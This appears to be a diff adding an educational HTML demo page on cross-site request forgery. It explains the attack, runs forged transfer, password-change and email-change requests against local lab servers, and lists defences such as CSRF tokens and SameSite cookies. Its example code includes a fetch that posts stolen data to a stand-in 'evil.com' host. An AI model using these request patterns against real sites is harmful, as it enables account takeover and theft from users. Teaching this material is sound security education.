@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Demo with Fetch</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        h1 {
+            color: white;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 2.5em;
+        }
+        
+        .section {
+            background: white;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        
+        .section h2 {
+            color: #667eea;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #667eea;
+            padding-bottom: 10px;
+        }
+        
+        .section h3 {
+            color: #333;
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+        
+        .explanation {
+            background: #f8f9fa;
+            border-left: 4px solid #2196F3;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+        
+        .vulnerable {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+        
+        .danger {
+            background: #f8d7da;
+            border-left: 4px solid #dc3545;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+        
+        .success {
+            background: #d4edda;
+            border-left: 4px solid #28a745;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+        
+        button {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+            margin: 5px;
+            transition: background 0.3s;
+        }
+        
+        button:hover {
+            background: #5568d3;
+        }
+        
+        button.danger {
+            background: #dc3545;
+        }
+        
+        button.danger:hover {
+            background: #c82333;
+        }
+        
+        .code-block {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+        
+        .result {
+            background: #fff;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        
+        .result.success {
+            border-color: #28a745;
+            background: #d4edda;
+        }
+        
+        .result.error {
+            border-color: #dc3545;
+            background: #f8d7da;
+        }
+        
+        ul, ol {
+            margin-left: 20px;
+            margin-top: 10px;
+        }
+        
+        li {
+            margin-bottom: 8px;
+        }
+        
+        .highlight {
+            background: yellow;
+            padding: 2px 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ CSRF Attack Demo with Fetch</h1>
+        
+        <!-- What is CSRF -->
+        <div class="section">
+            <h2>📚 What is CSRF (Cross-Site Request Forgery)?</h2>
+            
+            <div class="explanation">
+                <h3>Definition</h3>
+                <p><strong>CSRF</strong> is an attack that tricks a user's browser into making unauthorized requests to a website where the user is authenticated. The attack exploits the fact that browsers automatically include cookies (including session cookies) with requests to the same domain.</p>
+            </div>
+            
+            <div class="danger">
+                <h3>⚠️ Key Characteristics of CSRF:</h3>
+                <ul>
+                    <li><strong>User is authenticated</strong> on the target website</li>
+                    <li><strong>Attacker's site</strong> makes a request to the target site</li>
+                    <li><strong>Browser automatically includes cookies</strong> (session cookies)</li>
+                    <li><strong>User doesn't know</strong> the request is being made</li>
+                    <li><strong>Action is performed</strong> on behalf of the user</li>
+                </ul>
+            </div>
+            
+            <div class="vulnerable">
+                <h3>🔑 Critical Understanding: Attacker Does NOT Need Access to Bank Website!</h3>
+                <p><strong>This is a common misconception!</strong> The attacker does <strong>NOT</strong> need any access to the bank's website at all.</p>
+                
+                <h4>How CSRF Actually Works:</h4>
+                <ol>
+                    <li><strong>User visits bank.com</strong> and logs in → Bank sets a session cookie in the browser</li>
+                    <li><strong>User then visits attacker's website</strong> (evil.com) - completely different domain!</li>
+                    <li><strong>Attacker's page (evil.com) contains JavaScript</strong> that makes a request to bank.com</li>
+                    <li><strong>Browser automatically includes the bank's cookie</strong> with the request (because it's stored in the browser)</li>
+                    <li><strong>Bank receives the request</strong> with valid session cookie → thinks it's from the authenticated user</li>
+                    <li><strong>Attack succeeds</strong> - money transferred, password changed, etc.</li>
+                </ol>
+                
+                <h4>Key Point:</h4>
+                <p><strong>The attacker never accesses the bank's website.</strong> The attack happens from the attacker's own website (evil.com), but the browser automatically sends cookies from bank.com because they're stored in the same browser.</p>
+                
+                <div class="code-block">
+// This JavaScript runs on ATTACKER'S website (evil.com)
+// Attacker has NO access to bank.com at all!
+
+// User is logged into bank.com in the same browser
+// Browser has bank.com's session cookie stored
+
+// Attacker's page makes request to bank.com
+fetch('http://bank.com/api/transfer', {
+    method: 'POST',
+    credentials: 'include',  // Browser automatically includes bank.com cookies!
+    body: JSON.stringify({
+        to: 'attacker-account',
+        amount: 1000
+    })
+});
+
+// ✅ Attack succeeds even though:
+//    - Attacker has no access to bank.com
+//    - Attacker never visited bank.com
+//    - Request comes from evil.com, not bank.com
+//    - Browser automatically sends bank.com cookies!
+                </div>
+                
+                <h4>Why This Works:</h4>
+                <ul>
+                    <li><strong>Cookies are domain-specific</strong> but stored in the browser</li>
+                    <li><strong>Browser automatically includes cookies</strong> when making requests to that domain</li>
+                    <li><strong>Same-Origin Policy doesn't prevent this</strong> - it only prevents reading responses</li>
+                    <li><strong>CORS doesn't prevent this</strong> - it only controls reading responses, not sending requests</li>
+                    <li><strong>Attacker doesn't need to read the response</strong> - the action already happened!</li>
+                </ul>
+            </div>
+        </div>
+        
+        <!-- How Fetch is Used in CSRF -->
+        <div class="section">
+            <h2>🔍 How Fetch API is Used in CSRF Attacks</h2>
+            
+            <div class="explanation">
+                <h3>Why Fetch is Dangerous for CSRF:</h3>
+                <ul>
+                    <li><strong>Automatic Cookie Inclusion:</strong> With <code>credentials: 'include'</code>, fetch automatically sends cookies</li>
+                    <li><strong>No User Interaction:</strong> Can be triggered automatically (on page load, timer, etc.)</li>
+                    <li><strong>Silent Execution:</strong> Runs in background without user knowing</li>
+                    <li><strong>Cross-Origin Requests:</strong> Can make requests to any origin (if CORS allows)</li>
+                </ul>
+            </div>
+            
+            <h3>Example CSRF Attack with Fetch:</h3>
+            <div class="code-block">
+// This code runs on attacker's website (evil.com)
+// User is already logged into bank.com
+
+// Attack 1: Silent POST request
+fetch('http://bank.com/api/transfer', {
+    method: 'POST',
+    credentials: 'include',  // ⚠️ Automatically includes cookies!
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        to: 'attacker-account',
+        amount: 1000
+    })
+})
+.then(response => response.json())
+.then(data => {
+    // Send stolen data to attacker's server
+    fetch('http://evil.com/steal', {
+        method: 'POST',
+        body: JSON.stringify(data)
+    });
+});
+
+// Attack 2: Automatic on page load
+window.onload = function() {
+    // Transfer money as soon as page loads
+    fetch('http://bank.com/api/transfer', {
+        method: 'POST',
+        credentials: 'include',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ to: 'attacker', amount: 500 })
+    });
+};
+
+// Attack 3: Hidden form submission (traditional)
+// But fetch can do the same silently
+            </div>
+        </div>
+        
+        <!-- Attack Scenarios -->
+        <div class="section">
+            <h2>🎯 CSRF Attack Scenarios</h2>
+            
+            <div class="vulnerable">
+                <h3>Scenario 1: Money Transfer</h3>
+                <p><strong>Target:</strong> Banking website</p>
+                <p><strong>Attack:</strong> Transfer money to attacker's account</p>
+                <p><strong>Method:</strong> Fetch POST request with credentials</p>
+            </div>
+            
+            <div class="vulnerable">
+                <h3>Scenario 2: Password Change</h3>
+                <p><strong>Target:</strong> Social media or email account</p>
+                <p><strong>Attack:</strong> Change password to attacker's password</p>
+                <p><strong>Method:</strong> Fetch POST request to password change endpoint</p>
+            </div>
+            
+            <div class="vulnerable">
+                <h3>Scenario 3: Profile Update</h3>
+                <p><strong>Target:</strong> User profile settings</p>
+                <p><strong>Attack:</strong> Change email to attacker's email (account takeover)</p>
+                <p><strong>Method:</strong> Fetch PUT/PATCH request</p>
+            </div>
+        </div>
+        
+        <!-- Login Section -->
+        <div class="section">
+            <h2>🔐 Login to Servers</h2>
+            
+            <div class="explanation">
+                <p><strong>Step 1: Login to authenticate</strong></p>
+                <p>You need to login first before testing CSRF attacks. Use the buttons below to login to either server.</p>
+                <p><strong>Test Credentials:</strong> Username: <code>user123</code>, Password: <code>password123</code></p>
+            </div>
+            
+            <div class="danger">
+                <h3>⚠️ Login to Vulnerable Server (Port 3001)</h3>
+                <p>This server has no CSRF protection - attacks will succeed.</p>
+                <button class="danger" onclick="loginToVulnerableServer()">🔐 Login to Vulnerable Server</button>
+                <div id="loginVulnerableResult" class="result" style="display:none;"></div>
+            </div>
+            
+            <div class="success">
+                <h3>🛡️ Login to Secure Server (Port 3002)</h3>
+                <p>This server has CSRF protection - attacks will be blocked.</p>
+                <button onclick="loginToSecureServer()">🔐 Login to Secure Server</button>
+                <div id="loginSecureResult" class="result" style="display:none;"></div>
+            </div>
+        </div>
+        
+        <!-- Live Demo -->
+        <div class="section">
+            <h2>🧪 Live CSRF Attack Demo</h2>
+            
+            <div class="explanation">
+                <p><strong>Instructions:</strong></p>
+                <ol>
+                    <li>First, start the servers: <code>node vulnerable-csrf-server.js</code> and <code>node secure-csrf-server.js</code></li>
+                    <li>Use the login buttons above to authenticate</li>
+                    <li>Then click the attack buttons below to see CSRF in action</li>
+                </ol>
+            </div>
+            
+            <div class="danger">
+                <h3>⚠️ CSRF Attacks (Vulnerable Server)</h3>
+                <button class="danger" onclick="csrfAttack1()">💰 Transfer Money (CSRF)</button>
+                <button class="danger" onclick="csrfAttack2()">🔑 Change Password (CSRF)</button>
+                <button class="danger" onclick="csrfAttack3()">📧 Change Email (CSRF)</button>
+                <button class="danger" onclick="csrfAttack4()">🤖 Auto-Attack on Load</button>
+                <div id="csrfResult" class="result" style="display:none;"></div>
+            </div>
+            
+            <div class="success">
+                <h3>🛡️ Test Against Protected Server</h3>
+                <p>The secure server uses CSRF tokens to prevent these attacks.</p>
+                <button onclick="testProtectedServer()">🛡️ Test Protected Server</button>
+                <div id="protectedResult" class="result" style="display:none;"></div>
+            </div>
+        </div>
+        
+        <!-- Protection Methods -->
+        <div class="section">
+            <h2>🛡️ How to Protect Against CSRF</h2>
+            
+            <div class="success">
+                <h3>1. CSRF Tokens (Most Common)</h3>
+                <p>Server generates a unique token for each session. Client must include this token in requests.</p>
+                <div class="code-block">
+// Server generates token
+const csrfToken = generateRandomToken();
+session.csrfToken = csrfToken;
+
+// Client includes token in requests
+fetch('/api/transfer', {
+    method: 'POST',
+    headers: {
+        'X-CSRF-Token': csrfToken  // ✅ Required token
+    },
+    body: JSON.stringify({...})
+});
+
+// Server validates token
+if (req.headers['x-csrf-token'] !== session.csrfToken) {
+    return res.status(403).json({ error: 'Invalid CSRF token' });
+}
+                </div>
+            </div>
+            
+            <div class="success">
+                <h3>2. SameSite Cookie Attribute</h3>
+                <p>Prevents cookies from being sent in cross-site requests.</p>
+                <div class="code-block">
+// Set cookie with SameSite=Strict
+res.cookie('sessionId', sessionId, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'strict'  // ✅ Blocks cross-site requests
+});
+                </div>
+            </div>
+            
+            <div class="success">
+                <h3>3. Origin/Referer Header Validation</h3>
+                <p>Check that requests come from expected origins.</p>
+                <div class="code-block">
+// Server validates origin
+const allowedOrigins = ['https://bank.com'];
+if (!allowedOrigins.includes(req.headers.origin)) {
+    return res.status(403).json({ error: 'Invalid origin' });
+}
+                </div>
+            </div>
+            
+            <div class="success">
+                <h3>4. Double Submit Cookie Pattern</h3>
+                <p>Cookie and request body must both contain the same token.</p>
+            </div>
+        </div>
+        
+        <!-- Key Differences -->
+        <div class="section">
+            <h2>🔑 Key Points About CSRF with Fetch</h2>
+            
+            <div class="explanation">
+                <h3>Why Fetch Makes CSRF Easier:</h3>
+                <ul>
+                    <li><strong>No Form Needed:</strong> Traditional CSRF required forms, fetch doesn't</li>
+                    <li><strong>Programmatic:</strong> Can be triggered by any JavaScript event</li>
+                    <li><strong>Silent:</strong> Runs without user interaction</li>
+                    <li><strong>Flexible:</strong> Can send any HTTP method (GET, POST, PUT, DELETE)</li>
+                    <li><strong>Credentials:</strong> <code>credentials: 'include'</code> automatically sends cookies</li>
+                </ul>
+            </div>
+            
+            <div class="danger">
+                <h3>⚠️ Important Notes:</h3>
+                <ul>
+                    <li><strong>Attacker doesn't need access to target website:</strong> Attack happens from attacker's own site!</li>
+                    <li><strong>CORS doesn't prevent CSRF:</strong> CORS controls reading responses, not sending requests</li>
+                    <li><strong>Same-Origin Policy doesn't prevent CSRF:</strong> Requests are still sent, just responses can't be read</li>
+                    <li><strong>Authentication doesn't prevent CSRF:</strong> That's the whole point - user IS authenticated!</li>
+                    <li><strong>HTTPS doesn't prevent CSRF:</strong> It only encrypts the connection</li>
+                    <li><strong>Attacker doesn't need to read response:</strong> The action (transfer, password change) already happened!</li>
+                </ul>
+            </div>
+            
+            <div class="explanation">
+                <h3>Real-World Attack Scenario:</h3>
+                <ol>
+                    <li>User logs into their bank at <code>bank.com</code> → Cookie stored in browser</li>
+                    <li>User clicks a link in an email or visits <code>evil.com</code> (attacker's site)</li>
+                    <li>Attacker's page loads and automatically runs JavaScript</li>
+                    <li>JavaScript makes a POST request to <code>bank.com/api/transfer</code></li>
+                    <li>Browser automatically includes the bank's cookie (stored from step 1)</li>
+                    <li>Bank receives request with valid cookie → processes transfer</li>
+                    <li>Money is transferred to attacker's account</li>
+                    <li><strong>User never knew it happened!</strong></li>
+                </ol>
+                <p><strong>Note:</strong> The attacker never accessed bank.com. The attack worked because the browser automatically sent cookies from bank.com when the attacker's page made a request to bank.com.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const VULNERABLE_SERVER = 'http://localhost:3001';
+        const PROTECTED_SERVER = 'http://localhost:3002';
+        
+        // Store CSRF token for secure server
+        let csrfToken = null;
+        
+        function logResult(elementId, message, type = 'info') {
+            const resultDiv = document.getElementById(elementId);
+            resultDiv.style.display = 'block';
+            resultDiv.className = `result ${type}`;
+            resultDiv.textContent = message;
+        }
+        
+        // Login to Vulnerable Server
+        async function loginToVulnerableServer() {
+            logResult('loginVulnerableResult', '🔐 Logging in to vulnerable server...\n\n', 'info');
+            
+            try {
+                const response = await fetch(`${VULNERABLE_SERVER}/api/login`, {
+                    method: 'POST',
+                    credentials: 'include', // Important: include cookies
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username: 'user123',
+                        password: 'password123'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok) {
+                    logResult('loginVulnerableResult', 
+                        `✅ Login successful!\n\n` +
+                        `📊 Response: ${JSON.stringify(data, null, 2)}\n\n` +
+                        `🍪 Session cookie has been set.\n` +
+                        `⚠️ You can now try CSRF attacks - they will succeed!\n\n` +
+                        `User Info:\n` +
+                        `  - ID: ${data.user.id}\n` +
+                        `  - Name: ${data.user.name}\n` +
+                        `  - Email: ${data.user.email}`,
+                        'error' // Using 'error' style to indicate vulnerability
+                    );
+                } else {
+                    logResult('loginVulnerableResult', 
+                        `❌ Login failed: ${response.status}\n` +
+                        `Response: ${JSON.stringify(data, null, 2)}\n\n` +
+                        `Make sure:\n` +
+                        `- Server is running on port 3001\n` +
+                        `- Credentials are correct (user123/password123)`,
+                        'error'
+                    );
+                }
+            } catch (error) {
+                logResult('loginVulnerableResult', 
+                    `❌ Error: ${error.message}\n\n` +
+                    `Make sure the vulnerable server is running:\n` +
+                    `  node vulnerable-csrf-server.js`,
+                    'error'
+                );
+            }
+        }
+        
+        // Login to Secure Server
+        async function loginToSecureServer() {
+            logResult('loginSecureResult', '🔐 Logging in to secure server...\n\n', 'info');
+            
+            try {
+                const response = await fetch(`${PROTECTED_SERVER}/api/login`, {
+                    method: 'POST',
+                    credentials: 'include', // Important: include cookies
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username: 'user123',
+                        password: 'password123'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok) {
+                    // Store CSRF token for later use
+                    csrfToken = data.csrfToken;
+                    
+                    logResult('loginSecureResult', 
+                        `✅ Login successful!\n\n` +
+                        `📊 Response: ${JSON.stringify(data, null, 2)}\n\n` +
+                        `🍪 Session cookie has been set.\n` +
+                        `🛡️ CSRF Token received: ${csrfToken}\n\n` +
+                        `⚠️ CSRF attacks will be BLOCKED on this server!\n\n` +
+                        `User Info:\n` +
+                        `  - ID: ${data.user.id}\n` +
+                        `  - Name: ${data.user.name}\n` +
+                        `  - Email: ${data.user.email}\n\n` +
+                        `Note: The CSRF token must be included in all state-changing requests.`,
+                        'success'
+                    );
+                } else {
+                    logResult('loginSecureResult', 
+                        `❌ Login failed: ${response.status}\n` +
+                        `Response: ${JSON.stringify(data, null, 2)}\n\n` +
+                        `Make sure:\n` +
+                        `- Server is running on port 3002\n` +
+                        `- Credentials are correct (user123/password123)`,
+                        'error'
+                    );
+                }
+            } catch (error) {
+                logResult('loginSecureResult', 
+                    `❌ Error: ${error.message}\n\n` +
+                    `Make sure the secure server is running:\n` +
+                    `  node secure-csrf-server.js`,
+                    'error'
+                );
+            }
+        }
+        
+        // CSRF Attack 1: Transfer Money
+        async function csrfAttack1() {
+            logResult('csrfResult', '🚨 CSRF Attack: Attempting to transfer money...\n\n', 'error');
+            
+            try {
+                const response = await fetch(`${VULNERABLE_SERVER}/api/transfer`, {
+                    method: 'POST',
+                    credentials: 'include', // ⚠️ Automatically includes session cookies!
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        to: 'attacker-account-12345',
+                        amount: 1000
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok) {
+                    logResult('csrfResult', 
+                        `✅ CSRF ATTACK SUCCESSFUL!\n\n` +
+                        `💰 Money transferred: $${data.amount}\n` +
+                        `📤 To: ${data.to}\n` +
+                        `📊 Response: ${JSON.stringify(data, null, 2)}\n\n` +
+                        `⚠️ This attack worked because:\n` +
+                        `   - User is authenticated (cookies sent automatically)\n` +
+                        `   - Server doesn't validate CSRF token\n` +
+                        `   - Request came from cross-origin (this page)\n` +
+                        `   - User had no idea this happened!`,
+                        'error'
+                    );
+                } else {
+                    logResult('csrfResult', 
+                        `❌ Attack failed: ${response.status}\n` +
+                        `Response: ${JSON.stringify(data, null, 2)}\n\n` +
+                        `This might mean:\n` +
+                        `- User is not logged in\n` +
+                        `- Server has CSRF protection\n` +
+                        `- Server is not running`,
+                        'error'
+                    );
+                }
+            } catch (error) {
+                logResult('csrfResult', 
+                    `❌ Error: ${error.message}\n\n` +
+                    `Make sure:\n` +
+                    `1. Vulnerable server is running on port 3001\n` +
+                    `2. You've logged in at http://localhost:3001\n` +
+                    `3. Both are in the same browser`,
+                    'error'
+                );
+            }
+        }
+        
+        // CSRF Attack 2: Change Password
+        async function csrfAttack2() {
+            logResult('csrfResult', '🚨 CSRF Attack: Attempting to change password...\n\n', 'error');
+            
+            try {
+                const response = await fetch(`${VULNERABLE_SERVER}/api/change-password`, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        newPassword: 'hacked123',
+                        confirmPassword: 'hacked123'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok) {
+                    logResult('csrfResult', 
+                        `✅ CSRF ATTACK SUCCESSFUL!\n\n` +
+                        `🔑 Password changed to: ${data.newPassword || 'hacked123'}\n` +
+                        `📊 Response: ${JSON.stringify(data, null, 2)}\n\n` +
+                        `⚠️ Attacker now controls the account!`,
+                        'error'
+                    );
+                } else {
+                    logResult('csrfResult', 
+                        `❌ Attack failed: ${response.status}\n` +
+                        `Response: ${JSON.stringify(data, null, 2)}`,
+                        'error'
+                    );
+                }
+            } catch (error) {
+                logResult('csrfResult', `❌ Error: ${error.message}`, 'error');
+            }
+        }
+        
+        // CSRF Attack 3: Change Email
+        async function csrfAttack3() {
+            logResult('csrfResult', '🚨 CSRF Attack: Attempting to change email...\n\n', 'error');
+            
+            try {
+                const response = await fetch(`${VULNERABLE_SERVER}/api/change-email`, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        newEmail: 'attacker@evil.com'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok) {
+                    logResult('csrfResult', 
+                        `✅ CSRF ATTACK SUCCESSFUL!\n\n` +
+                        `📧 Email changed to: ${data.newEmail || 'attacker@evil.com'}\n` +
+                        `📊 Response: ${JSON.stringify(data, null, 2)}\n\n` +
+                        `⚠️ Attacker can now reset password via email!`,
+                        'error'
+                    );
+                } else {
+                    logResult('csrfResult', 
+                        `❌ Attack failed: ${response.status}\n` +
+                        `Response: ${JSON.stringify(data, null, 2)}`,
+                        'error'
+                    );
+                }
+            } catch (error) {
+                logResult('csrfResult', `❌ Error: ${error.message}`, 'error');
+            }
+        }
+        
+        // CSRF Attack 4: Automatic on page load
+        function csrfAttack4() {
+            logResult('csrfResult', 
+                `🤖 Auto-Attack Mode Enabled!\n\n` +
+                `This attack runs automatically when the page loads.\n` +
+                `In a real attack, this would happen silently.\n\n` +
+                `Triggering attack in 2 seconds...`,
+                'error'
+            );
+            
+            setTimeout(() => {
+                csrfAttack1();
+            }, 2000);
+        }
+        
+        // Test Protected Server
+        async function testProtectedServer() {
+            logResult('protectedResult', '🛡️ Testing protected server with CSRF token...\n\n', 'info');
+            
+            try {
+                // First, try without CSRF token (should fail)
+                const responseWithoutToken = await fetch(`${PROTECTED_SERVER}/api/transfer`, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        to: 'attacker-account',
+                        amount: 1000
+                    })
+                });
+                
+                const data = await responseWithoutToken.json();
+                
+                if (responseWithoutToken.status === 403) {
+                    logResult('protectedResult', 
+                        `✅ PROTECTION WORKING!\n\n` +
+                        `❌ Request blocked: ${responseWithoutToken.status}\n` +
+                        `📊 Response: ${JSON.stringify(data, null, 2)}\n\n` +
+                        `🛡️ Server correctly rejected request without CSRF token!\n\n` +
+                        `This demonstrates that CSRF attacks are blocked.\n` +
+                        `Even though cookies are sent, the missing CSRF token\n` +
+                        `prevents the attack from succeeding.`,
+                        'success'
+                    );
+                } else if (responseWithoutToken.status === 401) {
+                    logResult('protectedResult', 
+                        `⚠️ Not logged in!\n\n` +
+                        `Please login to the secure server first using the login button above.`,
+                        'error'
+                    );
+                } else {
+                    logResult('protectedResult', 
+                        `⚠️ Unexpected response: ${responseWithoutToken.status}\n` +
+                        `Response: ${JSON.stringify(data, null, 2)}\n\n` +
+                        `This might mean the server is not properly protected.`,
+                        'error'
+                    );
+                }
+            } catch (error) {
+                logResult('protectedResult', 
+                    `❌ Error: ${error.message}\n\n` +
+                    `Make sure:\n` +
+                    `- Protected server is running on port 3002\n` +
+                    `- You've logged in to the secure server`,
+                    'error'
+                );
+            }
+        }
+        
+        // Auto-attack demonstration (commented out by default)
+        // Uncomment to see automatic CSRF attack on page load
+        // window.addEventListener('load', () => {
+        //     console.log('Page loaded - CSRF attack could trigger here silently');
+        //     // csrfAttack1(); // This would run automatically
+        // });
+    </script>
+</body>
+</html>
+
